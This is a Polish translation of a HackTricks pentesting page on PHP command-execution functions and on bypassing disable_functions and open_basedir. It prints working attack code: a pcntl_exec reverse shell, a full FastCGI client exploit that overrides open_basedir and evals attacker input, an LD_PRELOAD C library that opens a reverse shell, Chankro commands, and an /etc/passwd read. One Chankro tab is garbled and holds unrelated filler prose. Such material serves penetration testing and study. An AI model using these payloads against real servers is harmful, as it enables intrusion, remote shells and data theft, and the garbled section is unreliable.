# PHP - Przydatne funkcje & wyłączanie\_funkcji/bypass open\_basedir

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF** sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Zdobądź [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**Grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Wykonanie poleceń i kodu w PHP

### Wykonanie poleceń w PHP

**Uwaga:** [p0wny-shell](https://github.com/flozz/p0wny-shell/blob/master/shell.php) php webshell może **automatycznie** sprawdzić i ominąć następujące funkcje, jeśli któreś z nich zostaną wyłączone.

**exec** - Zwraca ostatnią linię wyniku poleceń
```bash
echo exec("uname  -a");
```
**passthru** - Przekazuje wynik polecenia bezpośrednio do przeglądarki
```bash
echo passthru("uname -a");
```
**system** - Przekazuje wynik polecenia bezpośrednio do przeglądarki i zwraca ostatnią linię
```bash
echo system("uname -a");
```
**shell\_exec** - Zwraca wynik poleceń
```bash
echo shell_exec("uname -a");
```
\`\` (backticks) - To samo co shell\_exec()
```bash
echo `uname -a`
```
**popen** - Otwiera potok do odczytu lub zapisu dla procesu polecenia
```bash
echo fread(popen("/bin/ls /", "r"), 4096);
```
**proc\_open** - Podobne do popen(), ale z większym stopniem kontroli
```bash
proc_close(proc_open("uname -a",array(),$something));
```
**preg\_replace**
```php
<?php preg_replace('/.*/e', 'system("whoami");', ''); ?>
```
**pcntl\_exec** - Wykonuje program (domyślnie w nowoczesnym i nieco starszym PHP musisz załadować moduł `pcntl.so`, aby użyć tej funkcji)
```bash
pcntl_exec("/bin/bash", ["-c", "bash -i >& /dev/tcp/127.0.0.1/4444 0>&1"]);
```
**mail / mb\_send\_mail** - Ta funkcja służy do wysyłania wiadomości e-mail, ale może również zostać wykorzystana do wstrzykiwania arbitralnych poleceń wewnątrz parametru `$options`. Dzieje się tak, ponieważ **funkcja `mail` w PHP** zazwyczaj wywołuje binarny plik `sendmail` w systemie i pozwala na **dodawanie dodatkowych opcji**. Jednakże nie będziesz w stanie zobaczyć wyniku wykonanego polecenia, dlatego zaleca się utworzenie skryptu powłoki, który zapisuje wynik do pliku, wykonuje go za pomocą maila i drukuje wynik:
```bash
file_put_contents('/www/readflag.sh', base64_decode('IyEvYmluL3NoCi9yZWFkZmxhZyA+IC90bXAvZmxhZy50eHQKCg==')); chmod('/www/readflag.sh', 0777);  mail('', '', '', '', '-H \"exec /www/readflag.sh\"'); echo file_get_contents('/tmp/flag.txt');
```
**dl** - Ta funkcja może być używana do dynamicznego ładowania rozszerzenia PHP. Ta funkcja nie zawsze będzie dostępna, dlatego należy sprawdzić, czy jest dostępna przed próbą jej wykorzystania. Przeczytaj [tę stronę, aby dowiedzieć się, jak wykorzystać tę funkcję](disable\_functions-bypass-dl-function.md).

### Wykonanie Kodu PHP

Oprócz eval istnieją inne sposoby wykonania kodu PHP: include/require mogą być używane do zdalnego wykonania kodu w postaci podatności na lokalne dołączanie plików (Local File Include) i zdalne dołączanie plików (Remote File Include).
```php
${<php code>}              // If your input gets reflected in any PHP string, it will be executed.
eval()
assert()                   //  identical to eval()
preg_replace('/.*/e',...)  // e does an eval() on the match
create_function()          // Create a function and use eval()
include()
include_once()
require()
require_once()
$_GET['func_name']($_GET['argument']);

$func = new ReflectionFunction($_GET['func_name']);
$func->invoke();
// or
$func->invokeArgs(array());

// or serialize/unserialize function
```
## disable\_functions & open\_basedir

**Wyłączone funkcje** to ustawienie, które można skonfigurować w plikach `.ini` w PHP, które **zabrania** korzystania z określonych **funkcji**. **Open basedir** to ustawienie, które wskazuje PHP folder, do którego ma dostęp.\
Ustawienia PHP powinny być skonfigurowane w ścieżce _/etc/php7/conf.d_ lub podobnej.

Obie konfiguracje można zobaczyć w wyniku **`phpinfo()`**:

![](https://0xrick.github.io/images/hackthebox/kryptos/17.png)

![](<../../../../.gitbook/assets/image (490).png>)

## open\_basedir Bypass

`open_basedir` skonfiguruje foldery, do których PHP ma dostęp, **nie będziesz mógł pisać/czytać/wykonuj plików poza** tymi folderami, ale również **nie będziesz nawet mógł wyświetlić** innych katalogów.\
Jednakże, jeśli w jakiś sposób uda ci się wykonać dowolny kod PHP, możesz **spróbować** poniższego fragmentu **kodu**, aby **obejść** ograniczenie.

### Listing dirs with glob:// bypass

W tym pierwszym przykładzie użyto protokołu `glob://` z pewnym obejściem ścieżki:
```php
<?php
$file_list = array();
$it = new DirectoryIterator("glob:///v??/run/*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
$it = new DirectoryIterator("glob:///v??/run/.*");
foreach($it as $f) {
$file_list[] = $f->__toString();
}
sort($file_list);
foreach($file_list as $f){
echo "{$f}<br/>";
}
```
**Uwaga1**: W ścieżce można również użyć `/e??/*` aby wyświetlić `/etc/*` i dowolny inny folder.\
**Uwaga2**: Wygląda na to, że część kodu jest zduplikowana, ale jest to konieczne!\
**Uwaga3**: Ten przykład jest przydatny tylko do wyświetlania folderów, a nie do czytania plików

### Pełne obejście open\_basedir wykorzystujące FastCGI

Jeśli chcesz **dowiedzieć się więcej o PHP-FPM i FastCGI**, możesz przeczytać [pierwszą sekcję tej strony](disable\_functions-bypass-php-fpm-fastcgi.md).\
Jeśli **`php-fpm`** jest skonfigurowany, możesz go nadużyć, aby całkowicie ominąć **open\_basedir**:

![](<../../../../.gitbook/assets/image (542).png>)

![](<../../../../.gitbook/assets/image (574).png>)

Zauważ, że pierwszą rzeczą, którą musisz zrobić, jest znalezienie, gdzie znajduje się **gniazdo unixowe php-fpm**. Zazwyczaj znajduje się ono w `/var/run`, więc możesz **użyć poprzedniego kodu, aby wyświetlić katalog i je znaleźć**.\
Kod pochodzi [stąd](https://balsn.tw/ctf\_writeup/20190323-0ctf\_tctf2019quals/#wallbreaker-easy).
```php
<?php
/**
* Note : Code is released under the GNU LGPL
*
* Please do not change the header of this file
*
* This library is free software; you can redistribute it and/or modify it under the terms of the GNU
* Lesser General Public License as published by the Free Software Foundation; either version 2 of
* the License, or (at your option) any later version.
*
* This library is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY;
* without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
*
* See the GNU Lesser General Public License for more details.
*/
/**
* Handles communication with a FastCGI application
*
* @author      Pierrick Charron <pierrick@webstart.fr>
* @version     1.0
*/
class FCGIClient
{
const VERSION_1            = 1;
const BEGIN_REQUEST        = 1;
const ABORT_REQUEST        = 2;
const END_REQUEST          = 3;
const PARAMS               = 4;
const STDIN                = 5;
const STDOUT               = 6;
const STDERR               = 7;
const DATA                 = 8;
const GET_VALUES           = 9;
const GET_VALUES_RESULT    = 10;
const UNKNOWN_TYPE         = 11;
const MAXTYPE              = self::UNKNOWN_TYPE;
const RESPONDER            = 1;
const AUTHORIZER           = 2;
const FILTER               = 3;
const REQUEST_COMPLETE     = 0;
const CANT_MPX_CONN        = 1;
const OVERLOADED           = 2;
const UNKNOWN_ROLE         = 3;
const MAX_CONNS            = 'MAX_CONNS';
const MAX_REQS             = 'MAX_REQS';
const MPXS_CONNS           = 'MPXS_CONNS';
const HEADER_LEN           = 8;
/**
* Socket
* @var Resource
*/
private $_sock = null;
/**
* Host
* @var String
*/
private $_host = null;
/**
* Port
* @var Integer
*/
private $_port = null;
/**
* Keep Alive
* @var Boolean
*/
private $_keepAlive = false;
/**
* Constructor
*
* @param String $host Host of the FastCGI application
* @param Integer $port Port of the FastCGI application
*/
public function __construct($host, $port = 9000) // and default value for port, just for unixdomain socket
{
$this->_host = $host;
$this->_port = $port;
}
/**
* Define whether or not the FastCGI application should keep the connection
* alive at the end of a request
*
* @param Boolean $b true if the connection should stay alive, false otherwise
*/
public function setKeepAlive($b)
{
$this->_keepAlive = (boolean)$b;
if (!$this->_keepAlive && $this->_sock) {
fclose($this->_sock);
}
}
/**
* Get the keep alive status
*
* @return Boolean true if the connection should stay alive, false otherwise
*/
public function getKeepAlive()
{
return $this->_keepAlive;
}
/**
* Create a connection to the FastCGI application
*/
private function connect()
{
if (!$this->_sock) {
//$this->_sock = fsockopen($this->_host, $this->_port, $errno, $errstr, 5);
$this->_sock = stream_socket_client($this->_host, $errno, $errstr, 5);
if (!$this->_sock) {
throw new Exception('Unable to connect to FastCGI application');
}
}
}
/**
* Build a FastCGI packet
*
* @param Integer $type Type of the packet
* @param String $content Content of the packet
* @param Integer $requestId RequestId
*/
private function buildPacket($type, $content, $requestId = 1)
{
$clen = strlen($content);
return chr(self::VERSION_1)         /* version */
. chr($type)                    /* type */
. chr(($requestId >> 8) & 0xFF) /* requestIdB1 */
. chr($requestId & 0xFF)        /* requestIdB0 */
. chr(($clen >> 8 ) & 0xFF)     /* contentLengthB1 */
. chr($clen & 0xFF)             /* contentLengthB0 */
. chr(0)                        /* paddingLength */
. chr(0)                        /* reserved */
. $content;                     /* content */
}
/**
* Build an FastCGI Name value pair
*
* @param String $name Name
* @param String $value Value
* @return String FastCGI Name value pair
*/
private function buildNvpair($name, $value)
{
$nlen = strlen($name);
$vlen = strlen($value);
if ($nlen < 128) {
/* nameLengthB0 */
$nvpair = chr($nlen);
} else {
/* nameLengthB3 & nameLengthB2 & nameLengthB1 & nameLengthB0 */
$nvpair = chr(($nlen >> 24) | 0x80) . chr(($nlen >> 16) & 0xFF) . chr(($nlen >> 8) & 0xFF) . chr($nlen & 0xFF);
}
if ($vlen < 128) {
/* valueLengthB0 */
$nvpair .= chr($vlen);
} else {
/* valueLengthB3 & valueLengthB2 & valueLengthB1 & valueLengthB0 */
$nvpair .= chr(($vlen >> 24) | 0x80) . chr(($vlen >> 16) & 0xFF) . chr(($vlen >> 8) & 0xFF) . chr($vlen & 0xFF);
}
/* nameData & valueData */
return $nvpair . $name . $value;
}
/**
* Read a set of FastCGI Name value pairs
*
* @param String $data Data containing the set of FastCGI NVPair
* @return array of NVPair
*/
private function readNvpair($data, $length = null)
{
$array = array();
if ($length === null) {
$length = strlen($data);
}
$p = 0;
while ($p != $length) {
$nlen = ord($data{$p++});
if ($nlen >= 128) {
$nlen = ($nlen & 0x7F << 24);
$nlen |= (ord($data{$p++}) << 16);
$nlen |= (ord($data{$p++}) << 8);
$nlen |= (ord($data{$p++}));
}
$vlen = ord($data{$p++});
if ($vlen >= 128) {
$vlen = ($nlen & 0x7F << 24);
$vlen |= (ord($data{$p++}) << 16);
$vlen |= (ord($data{$p++}) << 8);
$vlen |= (ord($data{$p++}));
}
$array[substr($data, $p, $nlen)] = substr($data, $p+$nlen, $vlen);
$p += ($nlen + $vlen);
}
return $array;
}
/**
* Decode a FastCGI Packet
*
* @param String $data String containing all the packet
* @return array
*/
private function decodePacketHeader($data)
{
$ret = array();
$ret['version']       = ord($data{0});
$ret['type']          = ord($data{1});
$ret['requestId']     = (ord($data{2}) << 8) + ord($data{3});
$ret['contentLength'] = (ord($data{4}) << 8) + ord($data{5});
$ret['paddingLength'] = ord($data{6});
$ret['reserved']      = ord($data{7});
return $ret;
}
/**
* Read a FastCGI Packet
*
* @return array
*/
private function readPacket()
{
if ($packet = fread($this->_sock, self::HEADER_LEN)) {
$resp = $this->decodePacketHeader($packet);
$resp['content'] = '';
if ($resp['contentLength']) {
$len  = $resp['contentLength'];
while ($len && $buf=fread($this->_sock, $len)) {
$len -= strlen($buf);
$resp['content'] .= $buf;
}
}
if ($resp['paddingLength']) {
$buf=fread($this->_sock, $resp['paddingLength']);
}
return $resp;
} else {
return false;
}
}
/**
* Get Informations on the FastCGI application
*
* @param array $requestedInfo information to retrieve
* @return array
*/
public function getValues(array $requestedInfo)
{
$this->connect();
$request = '';
foreach ($requestedInfo as $info) {
$request .= $this->buildNvpair($info, '');
}
fwrite($this->_sock, $this->buildPacket(self::GET_VALUES, $request, 0));
$resp = $this->readPacket();
if ($resp['type'] == self::GET_VALUES_RESULT) {
return $this->readNvpair($resp['content'], $resp['length']);
} else {
throw new Exception('Unexpected response type, expecting GET_VALUES_RESULT');
}
}
/**
* Execute a request to the FastCGI application
*
* @param array $params Array of parameters
* @param String $stdin Content
```php
* @return String
*/
public function request(array $params, $stdin)
{
$response = '';
$this->connect();
$request = $this->buildPacket(self::BEGIN_REQUEST, chr(0) . chr(self::RESPONDER) . chr((int) $this->_keepAlive) . str_repeat(chr(0), 5));
$paramsRequest = '';
foreach ($params as $key => $value) {
$paramsRequest .= $this->buildNvpair($key, $value);
}
if ($paramsRequest) {
$request .= $this->buildPacket(self::PARAMS, $paramsRequest);
}
$request .= $this->buildPacket(self::PARAMS, '');
if ($stdin) {
$request .= $this->buildPacket(self::STDIN, $stdin);
}
$request .= $this->buildPacket(self::STDIN, '');
fwrite($this->_sock, $request);
do {
$resp = $this->readPacket();
if ($resp['type'] == self::STDOUT || $resp['type'] == self::STDERR) {
$response .= $resp['content'];
}
} while ($resp && $resp['type'] != self::END_REQUEST);
var_dump($resp);
if (!is_array($resp)) {
throw new Exception('Złe żądanie');
}
switch (ord($resp['content']{4})) {
case self::CANT_MPX_CONN:
throw new Exception('Ta aplikacja nie może wykonywać wielokrotnych połączeń [CANT_MPX_CONN]');
break;
case self::OVERLOADED:
throw new Exception('Nowe żądanie odrzucone; zbyt zajęty [OVERLOADED]');
break;
case self::UNKNOWN_ROLE:
throw new Exception('Nieznana wartość roli [UNKNOWN_ROLE]');
break;
case self::REQUEST_COMPLETE:
return $response;
}
}
}
?>
<?php
// prawdziwy exploit zaczyna się tutaj
if (!isset($_REQUEST['cmd'])) {
die("Sprawdź swoje dane wejściowe\n");
}
if (!isset($_REQUEST['filepath'])) {
$filepath = __FILE__;
}else{
$filepath = $_REQUEST['filepath'];
}
$req = '/'.basename($filepath);
$uri = $req .'?'.'command='.$_REQUEST['cmd'];
$client = new FCGIClient("unix:///var/run/php-fpm.sock", -1);
$code = "<?php eval(\$_REQUEST['command']);?>"; // ładunek php -- Nic nie robi
$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = php://input";
//$php_value = "allow_url_include = On\nopen_basedir = /\nauto_prepend_file = http://127.0.0.1/e.php";
$params = array(
'GATEWAY_INTERFACE' => 'FastCGI/1.0',
'REQUEST_METHOD'    => 'POST',
'SCRIPT_FILENAME'   => $filepath,
'SCRIPT_NAME'       => $req,
'QUERY_STRING'      => 'command='.$_REQUEST['cmd'],
'REQUEST_URI'       => $uri,
'DOCUMENT_URI'      => $req,
#'DOCUMENT_ROOT'     => '/',
'PHP_VALUE'         => $php_value,
'SERVER_SOFTWARE'   => '80sec/wofeiwo',
'REMOTE_ADDR'       => '127.0.0.1',
'REMOTE_PORT'       => '9985',
'SERVER_ADDR'       => '127.0.0.1',
'SERVER_PORT'       => '80',
'SERVER_NAME'       => 'localhost',
'SERVER_PROTOCOL'   => 'HTTP/1.1',
'CONTENT_LENGTH'    => strlen($code)
);
// print_r($_REQUEST);
// print_r($params);
//echo "Call: $uri\n\n";
echo $client->request($params, $code)."\n";
?>
```
Ten skrypty będą komunikować się z **gniazdem unix php-fpm** (zazwyczaj znajdującym się w /var/run, jeśli jest używany fpm) w celu wykonania dowolnego kodu. Ustawienia `open_basedir` zostaną nadpisane przez atrybut **PHP\_VALUE**, który jest wysyłany.\
Zauważ, jak używane jest `eval` do wykonania kodu PHP, który wysyłasz wewnątrz parametru **cmd**.\
Zauważ również **zakomentowaną linię 324**, możesz ją odkomentować, a **payload automatycznie połączy się z podanym adresem URL i wykonuje zawarty tam kod PHP**.\
Wystarczy wejść na `http://vulnerable.com:1337/l.php?cmd=echo file_get_contents('/etc/passwd');` aby uzyskać zawartość pliku `/etc/passwd`.

{% hint style="warning" %}
Możesz myśleć, że w taki sam sposób, w jaki nadpisaliśmy konfigurację `open_basedir`, możemy **nadpisać `disable_functions`**. Spróbuj, ale nie zadziała, wygląda na to, że **`disable_functions` można skonfigurować tylko w pliku konfiguracyjnym php** `.ini` i zmiany dokonane za pomocą PHP\_VALUE nie będą miały wpływu na tę konkretą ustawienie.
{% endhint %}

## bypassowanie disable\_functions

Jeśli uda ci się uruchomić kod PHP na maszynie, prawdopodobnie chcesz przejść do następnego poziomu i **wykonać dowolne polecenia systemowe**. W tej sytuacji zazwyczaj odkrywasz, że większość lub wszystkie **funkcje PHP**, które pozwalają na **wykonywanie poleceń systemowych, zostały wyłączone** w **`disable_functions`.**\
Zobaczmy więc, jak możesz ominąć to ograniczenie (jeśli możesz)

### Automatyczne odkrywanie bypassu

Możesz skorzystać z narzędzia [https://github.com/teambi0s/dfunc-bypasser](https://github.com/teambi0s/dfunc-bypasser), które wskaże, którą funkcję (jeśli jakąkolwiek) możesz użyć do **ominięcia** **`disable_functions`**.

### Ominięcie za pomocą innych funkcji systemowych

Wróć na początek tej strony i **sprawdź, czy któraś z funkcji wykonujących polecenia nie jest wyłączona i jest dostępna w środowisku**. Jeśli znajdziesz choć jedną z nich, będziesz mógł jej użyć do wykonania dowolnych poleceń systemowych.

### Ominięcie za pomocą LD\_PRELOAD

Jest powszechnie znane, że niektóre funkcje w PHP, takie jak `mail()`, będą **wykonywać binaria w systemie**. Dlatego możesz je wykorzystać, używając zmiennej środowiskowej `LD_PRELOAD`, aby załadować dowolną bibliotekę, która może wykonać cokolwiek.

#### Funkcje, które można użyć do ominięcia disable\_functions za pomocą LD\_PRELOAD

* **`mail`**
* **`mb_send_mail`**: Skuteczne, gdy zainstalowany jest moduł `php-mbstring`.
* **`imap_mail`**: Działa, jeśli moduł `php-imap` jest obecny.
* **`libvirt_connect`**: Wymaga modułu `php-libvirt-php`.
* **`gnupg_init`**: Możliwe do wykorzystania z zainstalowanym modułem `php-gnupg`.
* **`new imagick()`**: Ta klasa może być nadużyta do ominięcia ograniczeń. Szczegółowe techniki eksploatacji można znaleźć w obszernym [**opisie tutaj**](https://blog.bi0s.in/2019/10/23/Web/BSidesDelhi19-evalme/).

Możesz [**znaleźć tutaj**](https://github.com/tarunkant/fuzzphunc/blob/master/lazyFuzzer.py) skrypt fuzzujący, który został użyty do znalezienia tych funkcji.

Oto biblioteka, którą możesz skompilować, aby wykorzystać zmienną środowiskową `LD_PRELOAD`:
```php
#include <unistd.h>
#include <sys/types.h>
#include <stdio.h>
#include <stdlib.h>

uid_t getuid(void){
unsetenv("LD_PRELOAD");
system("bash -c \"sh -i >& /dev/tcp/127.0.0.1/1234 0>&1\"");
return 1;
}
```
#### Ominięcie za pomocą Chankro

Aby wykorzystać tę konfigurację, możesz użyć [**Chankro**](https://github.com/TarlogicSecurity/Chankro). Jest to narzędzie, które **generuje exploit w PHP**, który musisz przesłać na podatny serwer i wykonać (uzyskać do niego dostęp za pośrednictwem sieci).\
**Chankro** zapisze na dysku ofiary **bibliotekę i odwrócony shell**, który chcesz wykonać, i użyje sztuczki\*\*`LD_PRELOAD` + funkcji PHP `mail()`\*\* do wykonania odwróconego shella.

Zauważ, że aby użyć **Chankro**, `mail` i `putenv` **nie mogą znajdować się na liście `disable_functions`**.\
W poniższym przykładzie możesz zobaczyć, jak **utworzyć exploit Chankro** dla **architektury 64-bitowej**, który wykona polecenie `whoami` i zapisze wynik w _/tmp/chankro\_shell.out_, Chankro **zapisze bibliotekę i ładunek** w _/tmp_, a **ostateczny exploit** będzie nosił nazwę **bicho.php** (to plik, który musisz przesłać na serwer ofiary):

{% tabs %}
{% tab title="shell.sh" %}
```php
#!/bin/sh
whoami > /tmp/chankro_shell.out
```
{% endtab %}

{% tab title="Chankro" %}

### Funkcje PHP do wyłączania funkcji i bypassowania open_basedir

W PHP istnieją funkcje, które mogą być użyteczne podczas testowania penetracyjnego aplikacji internetowych. Kilka przykładów to `disable_functions` i `open_basedir`. Te funkcje mogą być obejścia, co pozwala na wykonanie działań, które normalnie byłyby zablokowane.

#### disable_functions

Funkcja `disable_functions` w PHP pozwala administratorom serwera na określenie, które funkcje PHP mogą zostać wyłączone. Jednak istnieje sposób na obejście tej funkcji, co umożliwia wykonanie zablokowanych działań.

#### open_basedir

`open_basedir` to funkcja PHP, która ogranicza, w jakich katalogach PHP może otwierać pliki. Istnieją techniki obejścia tej funkcji, które pozwalają na dostęp do plików spoza określonych ścieżek.

Te funkcje mogą być wykorzystane podczas testowania penetracyjnego aplikacji internetowych opartych na PHP, aby zidentyfikować potencjalne luki w zabezpieczeniach. 

{% endtab %}
```bash
python2 chankro.py --arch 64 --input shell.sh --path /tmp --output bicho.php
```
{% endtab %}
{% endtabs %}

Jeśli zauważysz, że funkcja **mail** jest zablokowana przez wyłączone funkcje, nadal możesz użyć funkcji **mb\_send\_mail**.\
Więcej informacji na temat tej techniki i Chankro znajdziesz tutaj: [https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/](https://www.tarlogic.com/en/blog/how-to-bypass-disable\_functions-and-open\_basedir/)

### "Bypass" za pomocą możliwości PHP

Zauważ, że za pomocą **PHP** możesz **czytać i pisać pliki, tworzyć katalogi i zmieniać uprawnienia**.\
Możesz nawet **wykonywać zrzuty baz danych**.\
Być może za pomocą **PHP** do **wyliczenia** pudełka znajdziesz sposób na eskalację uprawnień/wykonanie poleceń (na przykład odczytanie pewnego prywatnego klucza ssh).

Stworzyłem webshell, który ułatwia wykonywanie tych działań (zauważ, że większość webshelli również oferuje te opcje): [https://github.com/carlospolop/phpwebshelllimited](https://github.com/carlospolop/phpwebshelllimited)

### Bypassy zależne od modułów/wersji

Istnieje kilka sposobów na obejście disable\_functions, jeśli używany jest jakiś określony moduł lub wykorzystać określoną wersję PHP:

* [**FastCGI/PHP-FPM (FastCGI Process Manager)**](disable\_functions-bypass-php-fpm-fastcgi.md)
* [**Ominięcie za pomocą FFI - Foreign Function Interface włączone**](https://github.com/carlospolop/hacktricks/blob/master/network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable\_functions-open\_basedir-bypass/broken-reference/README.md)
* [**Ominięcie za pomocą mem**](disable\_functions-bypass-via-mem.md)
* [**mod\_cgi**](disable\_functions-bypass-mod\_cgi.md)
* [**Rozszerzenie PHP Perl Safe\_mode**](disable\_functions-bypass-php-perl-extension-safe\_mode-bypass-exploit.md)
* [**Funkcja dl**](disable\_functions-bypass-dl-function.md)
* [**Ten exploit**](https://github.com/mm0r1/exploits/tree/master/php-filter-bypass)
* 5.\* - podatne na eksploatację przy niewielkich zmianach w PoC
* 7.0 - wszystkie wersje do chwili obecnej
* 7.1 - wszystkie wersje do chwili obecnej
* 7.2 - wszystkie wersje do chwili obecnej
* 7.3 - wszystkie wersje do chwili obecnej
* 7.4 - wszystkie wersje do chwili obecnej
* 8.0 - wszystkie wersje do chwili obecnej
* [**Od 7.0 do 8.0 exploit (tylko Unix)**](https://github.com/mm0r1/exploits/blob/master/php-filter-bypass/exploit.php)
* [**PHP 7.0=7.4 (\*nix)**](disable\_functions-bypass-php-7.0-7.4-nix-only.md#php-7-0-7-4-nix-only)
* [**Imagick 3.3.0 PHP >= 5.4**](disable\_functions-bypass-imagick-less-than-3.3.0-php-greater-than-5.4-exploit.md)
* [**PHP 5.x Shellsock**](disable\_functions-php-5.x-shellshock-exploit.md)
* [**PHP 5.2.4 ionCube**](disable\_functions-php-5.2.4-ioncube-extension-exploit.md)
* [**PHP <= 5.2.9 Windows**](disable\_functions-bypass-php-less-than-5.2.9-on-windows.md)
* [**PHP 5.2.4/5.2.5 cURL**](disable\_functions-bypass-php-5.2.4-and-5.2.5-php-curl.md)
* [**PHP 5.2.3 -Win32std**](disable\_functions-bypass-php-5.2.3-win32std-ext-protections-bypass.md)
* [**PHP 5.2 FOpen exploit**](disable\_functions-bypass-php-5.2-fopen-exploit.md)
* [**PHP 4 >= 4.2.-, PHP 5 pcntl\_exec**](disable\_functions-bypass-php-4-greater-than-4.2.0-php-5-pcntl\_exec.md)

### **Automatyczne narzędzie**

Następujący skrypt próbuje niektórych z omówionych tutaj metod:\
[https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php](https://github.com/l3m0n/Bypass\_Disable\_functions\_Shell/blob/master/shell.php)

## Inne interesujące funkcje PHP

### Lista funkcji akceptujących wywołania zwrotne

Te funkcje akceptują parametr typu string, który może być użyty do wywołania funkcji wybranej przez atakującego. W zależności od funkcji atakujący może lub nie może mieć możliwość przekazania parametru. W takim przypadku można użyć funkcji ujawniania informacji, takiej jak phpinfo().

[Wywołania zwrotne / Wywoływalne](https://www.php.net/manual/en/language.types.callable.php)

[Poniższe listy stąd](https://stackoverflow.com/questions/3115559/exploitable-php-functions)
```php
// Function => Position of callback arguments
'ob_start' => 0,
'array_diff_uassoc' => -1,
'array_diff_ukey' => -1,
'array_filter' => 1,
'array_intersect_uassoc' => -1,
'array_intersect_ukey' => -1,
'array_map' => 0,
'array_reduce' => 1,
'array_udiff_assoc' => -1,
'array_udiff_uassoc' => array(-1, -2),
'array_udiff' => -1,
'array_uintersect_assoc' => -1,
'array_uintersect_uassoc' => array(-1, -2),
'array_uintersect' => -1,
'array_walk_recursive' => 1,
'array_walk' => 1,
'assert_options' => 1,
'uasort' => 1,
'uksort' => 1,
'usort' => 1,
'preg_replace_callback' => 1,
'spl_autoload_register' => 0,
'iterator_apply' => 1,
'call_user_func' => 0,
'call_user_func_array' => 0,
'register_shutdown_function' => 0,
'register_tick_function' => 0,
'set_error_handler' => 0,
'set_exception_handler' => 0,
'session_set_save_handler' => array(0, 1, 2, 3, 4, 5),
'sqlite_create_aggregate' => array(2, 3),
'sqlite_create_function' => 2,
```
### Ujawnienie informacji

Większość tych wywołań funkcji nie są ujściami. Ale może to być podatność, jeśli jakiekolwiek zwrócone dane są widoczne dla atakującego. Jeśli atakujący może zobaczyć phpinfo(), jest to zdecydowanie podatność.
```php
phpinfo
posix_mkfifo
posix_getlogin
posix_ttyname
getenv
get_current_user
proc_get_status
get_cfg_var
disk_free_space
disk_total_space
diskfreespace
getcwd
getlastmo
getmygid
getmyinode
getmypid
getmyuid
```
### Inne
```php
extract    // Opens the door for register_globals attacks (see study in scarlet).
parse_str  // works like extract if only one argument is given.
putenv
ini_set
mail       // has CRLF injection in the 3rd parameter, opens the door for spam.
header     // on old systems CRLF injection could be used for xss or other purposes, now it is still a problem if they do a header("location: ..."); and they do not die();. The script keeps executing after a call to header(), and will still print output normally. This is nasty if you are trying to protect an administrative area.
proc_nice
proc_terminate
proc_close
pfsockopen
fsockopen
apache_child_terminate
posix_kill
posix_mkfifo
posix_setpgid
posix_setsid
posix_setuid
```
### Funkcje systemu plików

Zgodnie z RATS wszystkie funkcje systemu plików w php są niebezpieczne. Niektóre z nich wydają się mało przydatne dla atakującego. Inne są bardziej przydatne, niż mogłoby się wydawać. Na przykład, jeśli allow\_url\_fopen=On, to adres URL można użyć jako ścieżkę do pliku, więc wywołanie copy($\_GET\['s'], $\_GET\['d']); można wykorzystać do przesłania skryptu PHP w dowolne miejsce w systemie. Ponadto, jeśli witryna jest podatna na żądanie wysłane za pomocą GET, każda z tych funkcji systemu plików może być wykorzystana do przekierowania ataku na inny host poprzez serwer. 

**Otwórz obsługę systemu plików**
```php
fopen
tmpfile
bzopen
gzopen
SplFileObject->__construct
```
**Zapisz do systemu plików (częściowo w połączeniu z odczytem)**
```php
chgrp
chmod
chown
copy
file_put_contents
lchgrp
lchown
link
mkdir
move_uploaded_file
rename
rmdir
symlink
tempnam
touch
unlink
imagepng     // 2nd parameter is a path.
imagewbmp    // 2nd parameter is a path.
image2wbmp   // 2nd parameter is a path.
imagejpeg    // 2nd parameter is a path.
imagexbm     // 2nd parameter is a path.
imagegif     // 2nd parameter is a path.
imagegd      // 2nd parameter is a path.
imagegd2     // 2nd parameter is a path.
iptcembed
ftp_get
ftp_nb_get
scandir
```
**Odczyt z systemu plików**
```php
file_exists
-- file_get_contents
file
fileatime
filectime
filegroup
fileinode
filemtime
fileowner
fileperms
filesize
filetype
glob
is_dir
is_executable
is_file
is_link
is_readable
is_uploaded_file
is_writable
is_writeable
linkinfo
lstat
parse_ini_file
pathinfo
readfile
readlink
realpath
stat
gzfile
readgzfile
getimagesize
imagecreatefromgif
imagecreatefromjpeg
imagecreatefrompng
imagecreatefromwbmp
imagecreatefromxbm
imagecreatefromxpm
ftp_put
ftp_nb_put
exif_read_data
read_exif_data
exif_thumbnail
exif_imagetype
hash_file
hash_hmac_file
hash_update_file
md5_file
sha1_file
-- highlight_file
-- show_source
php_strip_whitespace
get_meta_tags
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
